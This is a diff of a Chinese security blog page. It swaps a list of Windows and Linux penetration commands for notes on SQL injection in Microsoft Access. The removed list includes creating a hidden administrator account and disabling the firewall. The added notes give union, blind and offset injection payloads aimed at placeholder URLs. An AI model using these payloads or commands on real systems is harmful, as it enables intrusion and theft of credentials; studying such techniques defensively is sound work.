@@ -7,18 +7,18 @@
 
 
 
-    <meta name="description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+    <meta name="description" content="Access数据库注入笔记Access数据库是微软发布的关系型数据库管理系统，是Microsoft Office的系统程序之一，access的数据库结构是：表名—&amp;gt;列名—&amp;gt;内容字段，一个库若干张表。 Access注入的基本流程 判断是否存在注入 一般是在参数后面加特殊符号如单引号，反斜杠，双引号或者and 1=1,and 1=2等导致数据报错来判断。   判断数据的类型 从上面的报错信">
 <meta property="og:type" content="article">
 <meta property="og:title" content="lsadaharu">
-<meta property="og:url" content="http://yoursite.com/2019/08/04/windows与linux命令/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/08/17/Access数据库注入笔记/index.html">
 <meta property="og:site_name" content="lsadaharu">
-<meta property="og:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta property="og:description" content="Access数据库注入笔记Access数据库是微软发布的关系型数据库管理系统，是Microsoft Office的系统程序之一，access的数据库结构是：表名—&amp;gt;列名—&amp;gt;内容字段，一个库若干张表。 Access注入的基本流程 判断是否存在注入 一般是在参数后面加特殊符号如单引号，反斜杠，双引号或者and 1=1,and 1=2等导致数据报错来判断。   判断数据的类型 从上面的报错信">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="http://yoursite.com/images/og_image.png">
-<meta property="og:updated_time" content="2019-07-27T04:43:18.888Z">
+<meta property="og:updated_time" content="2019-08-17T03:32:15.758Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="lsadaharu">
-<meta name="twitter:description" content="渗透windows与linux常用命令渗透windows常用DOS命令 查看本机ip信息: ipconfig 释放ip: ipconfig/release 重新获取ip: ipconfig/renew 查看系统信息: systeminfo 查看局域网计算机列表: arp -a 查看目录信息: dir 切换目录: cd 目录名 打开某个文件: start 文件名 打开某个网页: start URL">
+<meta name="twitter:description" content="Access数据库注入笔记Access数据库是微软发布的关系型数据库管理系统，是Microsoft Office的系统程序之一，access的数据库结构是：表名—&amp;gt;列名—&amp;gt;内容字段，一个库若干张表。 Access注入的基本流程 判断是否存在注入 一般是在参数后面加特殊符号如单引号，反斜杠，双引号或者and 1=1,and 1=2等导致数据报错来判断。   判断数据的类型 从上面的报错信">
 <meta name="twitter:image" content="http://yoursite.com/images/og_image.png">
 
 
@@ -144,13 +144,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-08-04T02:44:41.273Z">2019-08-04</time>
+                <time class="level-item has-text-grey" datetime="2019-08-17T03:35:01.658Z">2019-08-17</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    7 minutes read (About 1010 words)
+                    7 minutes read (About 996 words)
                 </span>
                 
                 
@@ -163,69 +163,60 @@
             
         </h1>
         <div class="content">
-            <h1 id="渗透windows与linux常用命令"><a href="#渗透windows与linux常用命令" class="headerlink" title="渗透windows与linux常用命令"></a>渗透windows与linux常用命令</h1><h2 id="渗透windows常用DOS命令"><a href="#渗透windows常用DOS命令" class="headerlink" title="渗透windows常用DOS命令"></a>渗透windows常用DOS命令</h2><ol>
-<li>查看本机ip信息: <code>ipconfig</code></li>
-<li>释放ip: <code>ipconfig/release</code></li>
-<li>重新获取ip: <code>ipconfig/renew</code></li>
-<li>查看系统信息: <code>systeminfo</code></li>
-<li>查看局域网计算机列表: <code>arp -a</code></li>
-<li>查看目录信息: <code>dir</code></li>
-<li>切换目录: <code>cd 目录名</code></li>
-<li>打开某个文件: <code>start 文件名</code></li>
-<li>打开某个网页: <code>start URL</code></li>
-<li>创建文件内容: <code>echo xxxx &gt; x.txt</code></li>
-<li>查看文件内容: <code>type xxx.txt</code></li>
-<li>创建目录: <code>md 目录名</code></li>
-<li>删除文件夹: <code>rd 文件夹名</code></li>
-<li>删除文件: <code>del 文件名</code></li>
-<li>复制文件: <code>copy 文件名</code></li>
-<li>移动文件或文件夹: <code>move 文件(夹)名 路径</code></li>
-<li>以树形列出文件夹结构: <code>tree 文件夹名</code></li>
-<li>查看以启动的服务: <code>net start</code></li>
-<li>开启或停止某个服务: <code>net start(stop) 服务名</code></li>
-<li>查看端口占用进程情况: <code>netstat -ano</code></li>
-<li>查看本机用户信息: <code>net user</code></li>
-<li>查看用户组信息: <code>net localgroup</code></li>
-<li>创建用户username: <code>net user username/add</code></li>
-<li>创建隐藏用户username: <code>net user username$/add</code></li>
-<li>将用户username添加到管理用户组: `net localgroup administrators username/add</li>
-<li>更改用户username密码: <code>net user username 更改的密码</code></li>
-<li>删除用户username: <code>net user username/delete</code></li>
-<li>激活(禁用)用户username: <code>net user username/active:yes(no)</code></li>
-<li>开启3389: <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>或者<code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></li>
-<li>关闭防火墙: <code>netsh firewall set opmode mode=disable</code>或者<code>netsh advfirewall set allprofiles state off</code></li>
+            <h2 id="Access数据库注入笔记"><a href="#Access数据库注入笔记" class="headerlink" title="Access数据库注入笔记"></a>Access数据库注入笔记</h2><p>Access数据库是微软发布的关系型数据库管理系统，是Microsoft Office的系统程序之一，access的数据库结构是：表名—&gt;列名—&gt;内容字段，一个库若干张表。</p>
+<h2 id="Access注入的基本流程"><a href="#Access注入的基本流程" class="headerlink" title="Access注入的基本流程"></a>Access注入的基本流程</h2><ol>
+<li>判断是否存在注入<ul>
+<li>一般是在参数后面加特殊符号如单引号，反斜杠，双引号或者and 1=1,and 1=2等导致数据报错来判断。</li>
+</ul>
+</li>
+<li>判断数据的类型<ul>
+<li>从上面的报错信息可以判断是否为Access数据库，若报错字段中有Microsoft JET Database Engine的字样，则说明这个网站使用的数据库是Access数据库。</li>
+<li>通过构造sql语句判断如<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com?id=1 and (select count(*) from sysobjects)&gt;0</span><br><span class="line">http://www.xxx.com?id=1 and (select count(*) from msysobjects)&gt;0</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
 </ol>
-<h1 id="渗透linux常见命令"><a href="#渗透linux常见命令" class="headerlink" title="渗透linux常见命令"></a>渗透linux常见命令</h1><ol>
-<li>显示主机信息: <code>uname -a</code></li>
-<li>查看主机名: <code>hostname</code></li>
-<li>查看ip信息: <code>ipconfig</code></li>
-<li>查看当前路径: <code>pwd</code></li>
-<li>查看当前目录文件: <code>ls</code> 查看目录文件详细信息<code>ls -l</code></li>
-<li>创建目录: <code>mkdir 目录名</code></li>
-<li>创建新文件: <code>touch 文件名</code></li>
-<li>为文件创建软连接: <code>ln -s 源文件或者目录 链接文件或者目录</code></li>
-<li>复制文件或者目录: <code>cp 源文件或目录 目标文件或目录</code></li>
-<li>删除文件或目录: <code>rm -f</code>强制删除不提醒，<code>rm -r</code>递归删除整个目录树,<code>rm -i</code>删除文件或目录提醒。</li>
-<li>移动文件: <code>mv 源文件或目录</code></li>
-<li>查找文件: <code>find -name 文件名</code></li>
-<li>查看文件内容: <code>cat</code>+文件名</li>
-<li>分页显示文件内容: <code>more</code>+文件名</li>
-<li>查看文件属性: <code>file</code>+文件名</li>
-<li>gzip压缩打包以及解压:<code>gizp -9</code>+文件，最大压缩比压缩。保留源文件压缩<code>gzip -c 文件名 &gt; 文件名.gz</code>解压<code>gzip -dv</code>+文件名.gz，保留源文件解压<code>gzip -cd 文件名.gz &gt; 压缩文件存放的目录地址</code></li>
-<li>bzip2压缩打包: <code>bzip2</code>+文件名。保留源文件压缩<code>bzip2 -k</code>+文件名.解压<code>bzip2 -dv</code>+文件名.bzip2 .保留源文件解压: <code>bzip2 -kd</code>+文件名.bzip2</li>
-<li>tar压缩解压: 以gzip格式压缩<code>tar -zcvf newfile.tar.gz 源文件</code>  gzip格式解压 <code>tar -zxvf 压缩包名 -C 解压的文件放置的目录</code> 以bzip2格式压缩 <code>tar -jcvf newfile.tar.bzip2 源文件</code> 以bzip2格式解压 <code>tar -jxvf 压缩包名 -C 解压的文件放置的目录</code> 查看压缩包中的内容<code>tar -tvf 压缩包名</code></li>
-<li>改变文件权限: <code>chmod (r-&gt;4 w-&gt;2 x-&gt;1)777 文件名</code>或者按user(所有者)-&gt;u，group(组)-&gt;u，others(其他人)-&gt;u,三套属性a.r-&gt;(可读),w-&gt;(可写),x-&gt;(可执行)赋予权限，如chmod u+r test.c-&gt;赋予test.c所有者可读权限.chmod a+w test.c-&gt;赋予test.c所有者，组，以及其他人可写权限。</li>
-<li>更改文件/目录所属的拥有者和组: <code>chown 拥有者名:组名 文件或目录名</code> 只修改所属组: <code>chogrp -R 组名 文件或目录名</code></li>
-<li>添加用户: <code>adduser 用户名</code> 修改密码 <code>passwd 用户名</code>删除用户 <code>userdel 用户名</code></li>
-<li>查看目前登陆身份: <code>whoami</code></li>
-<li>查看目前登陆的用户和组: <code>id</code></li>
-<li>显示磁盘可读的情况: <code>df -h</code></li>
-<li>显示最后登陆的用户: <code>last</code></li>
-<li>查看进程: <code>ps -aux</code> 进程的动态情况 <code>top</code></li>
-<li>终止进程: <code>kill -9 PID</code></li>
-<li>显示进程ID的网络接口: <code>netstat -tulpn</code></li>
-<li>启动ip转发: <code>echo &#39;1&#39; &gt; /proc/sys/net/ipv4/ip_forward</code></li>
+<p>如果sysobjects的sql语句后返回的页面显示正常，msysobjects的sql语句返回的页面不正常则说明网站数据库使用的是sql server的数据库<br>如果sysobjects和msysobjects的sql语句返回的页面都不正常，或者msysobjects的sql语句返回的页面显示正常，则说明数据库使用的是Access数据库。<br>还可以通过判断是否支持len函数和chr函数，且不支持length和char函数来判断是Access数据库。</p>
+<ol start="3">
+<li>查询字段数<ul>
+<li>使用order by 猜测字段数，方法和其他数据库猜测字段数一样。</li>
+</ul>
+</li>
+<li><p>猜测表名</p>
+<ul>
+<li>如果有系统表则可直接注入<code>UNION SELECT Name, NULL, NULL, NULL, NULL from MSysObjects WHERE Type=1</code></li>
+<li>由于Access数据库的系统表一般不可访问，所以数据库的表名只能通过猜测来获取，常见的管理表有：admin,login,admin_user等。<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and exists(select * from admin)页面返回正常则admin表存在。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>猜测列名</p>
+<ul>
+<li>在知道表名的情况下使用如下查询<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and exists(select 列名 from 表名)页面返回正常则列名存在。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>猜解内容</p>
+<ul>
+<li>确定内容的行数<code>id=1 and IIF((select count(*) from 表名)=X，1，0）</code>X为大于0的任意数</li>
+<li>确定内容的长度<code>id=1 and (select top 1 len(列名） from 表名)&gt;N</code>,top表示把最这个列的第一条数据取出来，N表示猜测的列名长度。可用二分法来减少猜测次数。</li>
+<li>判断内容<code>id=1 and (select top 1 asc(mid(列名，1，1)） from 表名)=97</code>判断这个列的第一个数据的第一位，97为‘a’的ascii码的值，以此来逐个猜解。</li>
+</ul>
+</li>
 </ol>
+<h2 id="Access的偏移注入"><a href="#Access的偏移注入" class="headerlink" title="Access的偏移注入"></a>Access的偏移注入</h2><ol>
+<li>适用于偏移注入的条件<ul>
+<li>主查询语句的字段数大于目标表列的字段数。</li>
+<li>知道目标表的任意字段。</li>
+</ul>
+</li>
+<li>注入的原理<br>偏移注入使用的是union联合查询来判断的，union联合查询需要列的数目相等。构造语句为：<br><code>select * from (admin as a inner join admin as b on a.id=b.id)</code><br>*代表查询的字段，（admin as a inner join admin as b on a.id=b.id)表示将admin表记为a,同时也为b,然后查询条件是a表的id列与b表的id列相等，返回所有相等的行，a,b属于同一个表，所以会全部返回。<br>如：<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.asp?id=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 from admin</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>假设有五个表列则<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.asp?id=1 union select 1,2,3,4,5,6,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure></p>
+<p>如果没有爆破出可多设这个表<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://XXXX.asp?id=1 union select 1,2,3,4,5,6,a.id,* from (admin as a inner join admin as b on a.id=b.id)</span><br><span class="line"></span><br><span class="line">http://XXXX.asp?id=1 union select 1,2,3,4,5,6,a.id,b.id,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure></p>
+<p>这里*的字段排列顺序被打乱了，可以增加显示位的机率。</p>
+<hr>
+<p>还有很多好的思路可以参考文章：<a href="https://www.t00ls.net/articles-38412.html?page=2" target="_blank" rel="noopener">https://www.t00ls.net/articles-38412.html?page=2</a></p>
 
         </div>
         
@@ -275,16 +266,9 @@
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/08/04/sql注入_mysql_3/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item"></span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/04/sql注入_mysql_4/">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/08/17/MSSQL注入笔记/">
                 <span class="level-item"></span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
